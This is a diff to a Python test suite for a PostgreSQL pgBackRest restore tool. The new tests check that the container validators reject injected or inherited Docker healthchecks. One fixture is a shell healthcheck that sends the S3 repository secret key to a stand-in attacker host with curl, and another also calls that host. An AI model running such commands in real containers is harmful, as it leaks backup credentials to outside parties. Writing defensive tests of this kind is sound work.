@@ -23,6 +23,7 @@ from scripts.postgres_restore_generation import (
     GenerationError,
     GenerationState,
     ProviderPolicy,
+    admit_restore_container,
     authorize_and_start_target,
     build_pgbackrest_config,
     load_provider_policy,
@@ -133,6 +134,7 @@ def approved_image_manifest() -> dict[str, object]:
             "PGDATA=/var/lib/postgresql/data",
             "PATH=/usr/bin",
         ],
+        "healthcheck": None,
         "postgres_pgdata": "/var/lib/postgresql/data",
         "postgres_version": "16",
         "pgbackrest_version": "2.59.0",
@@ -577,6 +579,74 @@ class RestoreConfigurationTests(unittest.TestCase):
             "cipher_pass": "C" * 32,
         }
 
+    def restore_fixture(
+        self,
+    ) -> tuple[dict[str, str], list[str], dict[str, object], dict[str, object]]:
+        secrets = validate_repository_secret(
+            canonical_json(self.repository_capability), self.state
+        )
+        restore_command = [
+            "--config=/etc/pgbackrest/pgbackrest.conf",
+            "--stanza=adapteng-ops",
+            "--repo=1",
+            "--pg1-path=/restore/a/pgdata",
+            "--set=20260731-080000F",
+            "--type=immediate",
+            "--target-action=promote",
+            "restore",
+        ]
+        image_environment = approved_image_manifest()["image_environment"]
+        container: dict[str, object] = {
+            "Id": "restore-id",
+            "Name": "/adapteng-pgbackrest-a",
+            "Image": self.state.image_config_id,
+            "Path": "pgbackrest",
+            "Args": restore_command,
+            "State": {"Running": False},
+            "Config": {
+                "Image": self.state.image_repo_digest,
+                "Hostname": "adapteng-pgbackrest-a",
+                "User": "postgres",
+                "Entrypoint": ["pgbackrest"],
+                "Cmd": restore_command,
+                "Env": [
+                    *image_environment,
+                    *(f"{key}={value}" for key, value in sorted(secrets.items())),
+                ],
+                "Healthcheck": None,
+            },
+            "HostConfig": safe_host_config(self.state.bootstrap_network),
+            "NetworkSettings": {
+                "Networks": {self.state.bootstrap_network: {}},
+            },
+            "Mounts": [
+                {
+                    "Type": "volume",
+                    "Name": self.state.volume,
+                    "Destination": self.state.restore_pg1_path,
+                    "RW": True,
+                },
+                {
+                    "Type": "bind",
+                    "Source": str(Path("/secure/pgbackrest.conf")),
+                    "Destination": "/etc/pgbackrest/pgbackrest.conf",
+                    "RW": False,
+                },
+            ],
+        }
+        image: dict[str, object] = {
+            "Id": self.state.image_config_id,
+            "RepoDigests": [self.state.image_repo_digest],
+            "Os": "linux",
+            "Architecture": "amd64",
+            "Config": {
+                "Env": image_environment,
+                "User": "postgres",
+                "Healthcheck": None,
+            },
+        }
+        return secrets, restore_command, container, image
+
     def test_public_pgbackrest_config_is_generated_from_exact_state(self) -> None:
         config = build_pgbackrest_config(self.state).decode("ascii")
         self.assertIn("repo1-type=s3", config)
@@ -630,62 +700,7 @@ class RestoreConfigurationTests(unittest.TestCase):
             validate_repository_secret(b"# comment\n{}", self.state)
 
     def test_restore_container_is_measured_before_same_id_start(self) -> None:
-        secrets = validate_repository_secret(
-            canonical_json(self.repository_capability), self.state
-        )
-        restore_command = [
-            "--config=/etc/pgbackrest/pgbackrest.conf",
-            "--stanza=adapteng-ops",
-            "--repo=1",
-            "--pg1-path=/restore/a/pgdata",
-            "--set=20260731-080000F",
-            "--type=immediate",
-            "--target-action=promote",
-            "restore",
-        ]
-        image_environment = approved_image_manifest()["image_environment"]
-        container = {
-            "Id": "restore-id",
-            "Name": "/adapteng-pgbackrest-a",
-            "Image": self.state.image_config_id,
-            "Path": "pgbackrest",
-            "Args": restore_command,
-            "State": {"Running": False},
-            "Config": {
-                "Image": self.state.image_repo_digest,
-                "Hostname": "adapteng-pgbackrest-a",
-                "User": "postgres",
-                "Entrypoint": ["pgbackrest"],
-                "Cmd": restore_command,
-                "Env": [
-                    *image_environment,
-                    *(f"{key}={value}" for key, value in sorted(secrets.items())),
-                ],
-            },
-            "HostConfig": safe_host_config(self.state.bootstrap_network),
-            "NetworkSettings": {
-                "Networks": {self.state.bootstrap_network: {}},
-            },
-            "Mounts": [
-                {
-                    "Type": "volume",
-                    "Name": self.state.volume,
-                    "Destination": self.state.restore_pg1_path,
-                    "RW": True,
-                },
-                {
-                    "Type": "bind",
-                    "Source": str(Path("/secure/pgbackrest.conf")),
-                    "Destination": "/etc/pgbackrest/pgbackrest.conf",
-                    "RW": False,
-                },
-            ],
-        }
-        image = {
-            "Id": self.state.image_config_id,
-            "RepoDigests": [self.state.image_repo_digest],
-            "Config": {"Env": image_environment, "User": "postgres"},
-        }
+        secrets, restore_command, container, image = self.restore_fixture()
         identity = validate_restore_container(
             container=container,
             image=image,
@@ -697,6 +712,10 @@ class RestoreConfigurationTests(unittest.TestCase):
             secrets=secrets,
         )
         self.assertNotIn("A" * 32, json.dumps(identity))
+        self.assertRegex(
+            identity["container_raw_inspect_sha256"], r"^[0-9a-f]{64}$"
+        )
+        self.assertRegex(identity["image_raw_inspect_sha256"], r"^[0-9a-f]{64}$")
 
         attacks = [
             {**container, "Id": "replacement"},
@@ -744,6 +763,144 @@ class RestoreConfigurationTests(unittest.TestCase):
                     secrets=secrets,
                 )
 
+    def test_restore_admission_rejects_inherited_and_drifted_healthchecks(self) -> None:
+        secrets, command, container, image = self.restore_fixture()
+
+        def old_projection(
+            candidate: dict[str, object], candidate_image: dict[str, object]
+        ) -> dict[str, object]:
+            config = candidate["Config"]
+            assert isinstance(config, dict)
+            image_config = candidate_image["Config"]
+            assert isinstance(image_config, dict)
+            return {
+                "path": candidate["Path"],
+                "args": candidate["Args"],
+                "environment": config["Env"],
+                "image_environment": image_config["Env"],
+                "network": candidate["HostConfig"],
+                "mounts": candidate["Mounts"],
+            }
+
+        baseline_projection = old_projection(container, image)
+        attacks: list[tuple[dict[str, object], dict[str, object]]] = []
+        for healthcheck in (
+            {
+                "Test": [
+                    "CMD-SHELL",
+                    "curl -s https://attacker.invalid/?k=$"
+                    "PGBACKREST_REPO1_S3_KEY_SECRET",
+                ]
+            },
+            {"Test": ["CMD", "curl", "https://attacker.invalid/"]},
+            {},
+        ):
+            attack = json.loads(json.dumps(container))
+            attack["Config"]["Healthcheck"] = healthcheck
+            attacks.append((attack, image))
+        inherited = json.loads(json.dumps(image))
+        inherited["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
+        attacks.append((container, inherited))
+        case_variant = json.loads(json.dumps(container))
+        case_variant["Config"]["healthcheck"] = {"Test": ["CMD", "id"]}
+        attacks.append((case_variant, image))
+
+        for attack_container, attack_image in attacks:
+            with self.subTest():
+                self.assertEqual(
+                    old_projection(attack_container, attack_image),
+                    baseline_projection,
+                )
+                with self.assertRaisesRegex(
+                    GenerationError,
+                    "execution identity is not supported",
+                ) as caught:
+                    validate_restore_container(
+                        container=attack_container,
+                        image=attack_image,
+                        state=self.state,
+                        container_id="restore-id",
+                        container_name="adapteng-pgbackrest-a",
+                        restore_command=command,
+                        config_path=Path("/secure/pgbackrest.conf"),
+                        secrets=secrets,
+                    )
+                self.assertNotIn("attacker.invalid", str(caught.exception))
+
+        inspected = [
+            json.loads(json.dumps(container)),
+            json.loads(json.dumps(image)),
+            json.loads(json.dumps(container)),
+            json.loads(json.dumps(image)),
+        ]
+        inspected[2]["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
+        self.assertEqual(
+            old_projection(inspected[0], inspected[1]),
+            old_projection(inspected[2], inspected[3]),
+        )
+
+        def inspect(kind: str, _reference: str) -> dict[str, object]:
+            expected = "container" if len(inspected) in {4, 2} else "image"
+            self.assertEqual(kind, expected)
+            return inspected.pop(0)
+
+        with self.assertRaises(GenerationError):
+            admit_restore_container(
+                state=self.state,
+                container_id="restore-id",
+                container_name="adapteng-pgbackrest-a",
+                restore_command=command,
+                config_path=Path("/secure/pgbackrest.conf"),
+                secrets=secrets,
+                inspect=inspect,
+            )
+        self.assertEqual(inspected, [])
+
+        raw_drift = [
+            json.loads(json.dumps(container)),
+            json.loads(json.dumps(image)),
+            json.loads(json.dumps(container)),
+            json.loads(json.dumps(image)),
+        ]
+        raw_drift[2]["Config"]["StopSignal"] = "SIGTERM"
+
+        def inspect_drift(_kind: str, _reference: str) -> dict[str, object]:
+            return raw_drift.pop(0)
+
+        with self.assertRaisesRegex(
+            GenerationError, "identity changed before start"
+        ):
+            admit_restore_container(
+                state=self.state,
+                container_id="restore-id",
+                container_name="adapteng-pgbackrest-a",
+                restore_command=command,
+                config_path=Path("/secure/pgbackrest.conf"),
+                secrets=secrets,
+                inspect=inspect_drift,
+            )
+        self.assertEqual(raw_drift, [])
+
+    def test_restore_docker_parser_rejects_duplicate_healthcheck_keys(self) -> None:
+        payload = (
+            '[{"Config":{"Healthcheck":null,'
+            '"Healthcheck":{"Test":["CMD","id"]}}}]'
+        )
+        self.assertEqual(
+            json.loads(payload)[0]["Config"]["Healthcheck"]["Test"],
+            ["CMD", "id"],
+        )
+
+        def execute(
+            *_args: object, **_kwargs: object
+        ) -> subprocess.CompletedProcess[str]:
+            return subprocess.CompletedProcess([], 0, stdout=payload, stderr="")
+
+        with self.assertRaisesRegex(GenerationError, "invalid JSON"):
+            restore_generation.docker_inspect_one(
+                "container", "restore-id", execute=execute
+            )
+
 
 class GuardBoundaryTests(unittest.TestCase):
     def test_generation_names_are_exact(self) -> None:
@@ -783,6 +940,20 @@ class GuardBoundaryTests(unittest.TestCase):
         with self.assertRaises(GuardError):
             validate_container(
                 container,
+                "adapteng-recover-a",
+                "none",
+                "adapteng-restore-a",
+                "/var/lib/postgresql/data",
+            )
+
+        healthcheck = target_container(
+            running=False, target_kind="recovery", container_id="d" * 64
+        )
+        healthcheck["NetworkSettings"]["Networks"] = {"none": {}}
+        healthcheck["Config"]["Healthcheck"] = {"Test": ["CMD-SHELL", "id"]}
+        with self.assertRaisesRegex(GuardError, "execution identity is unsafe"):
+            validate_container(
+                healthcheck,
                 "adapteng-recover-a",
                 "none",
                 "adapteng-restore-a",
@@ -844,7 +1015,10 @@ class GuardBoundaryTests(unittest.TestCase):
                             "Id": "container-id",
                             "Image": manifest["config_id"],
                             "Platform": "linux",
-                            "Config": {"Image": manifest["repo_digest"]},
+                            "Config": {
+                                "Image": manifest["repo_digest"],
+                                "Healthcheck": None,
+                            },
                         }
                     ]
                 return [
@@ -853,7 +1027,10 @@ class GuardBoundaryTests(unittest.TestCase):
                         "RepoDigests": [manifest["repo_digest"]],
                         "Os": "linux",
                         "Architecture": "amd64",
-                        "Config": {"Env": manifest["image_environment"]},
+                        "Config": {
+                            "Env": manifest["image_environment"],
+                            "Healthcheck": None,
+                        },
                     }
                 ]
 
@@ -861,6 +1038,52 @@ class GuardBoundaryTests(unittest.TestCase):
                 "candidate", path, sha256_bytes(raw), inspect=inspect
             )
             self.assertEqual(packet["status"], "MEASURED_APPROVED")
+            self.assertIsNone(packet["healthcheck"])
+            self.assertRegex(packet["image_raw_inspect_sha256"], r"^[0-9a-f]{64}$")
+
+            for location in ("container", "image"):
+                def hostile_inspect(*args: str) -> object:
+                    if args[:2] == ("container", "inspect"):
+                        value = {
+                            "Id": "container-id",
+                            "Image": manifest["config_id"],
+                            "Platform": "linux",
+                            "Config": {
+                                "Image": manifest["repo_digest"],
+                                "Healthcheck": None,
+                            },
+                        }
+                        if location == "container":
+                            value["Config"]["Healthcheck"] = {
+                                "Test": ["CMD-SHELL", "id"]
+                            }
+                        return [value]
+                    value = {
+                        "Id": manifest["config_id"],
+                        "RepoDigests": [manifest["repo_digest"]],
+                        "Os": "linux",
+                        "Architecture": "amd64",
+                        "Config": {
+                            "Env": manifest["image_environment"],
+                            "Healthcheck": None,
+                        },
+                    }
+                    if location == "image":
+                        value["Config"]["Healthcheck"] = {
+                            "Test": ["CMD", "id"]
+                        }
+                    return [value]
+
+                with self.subTest(location=location):
+                    with self.assertRaisesRegex(
+                        IdentityError, "healthcheck identity is not exact"
+                    ):
+                        measure_container(
+                            "candidate",
+                            path,
+                            sha256_bytes(raw),
+                            inspect=hostile_inspect,
+                        )
 
     def test_multiple_image_digest_is_rejected(self) -> None:
         manifest = approved_image_manifest()
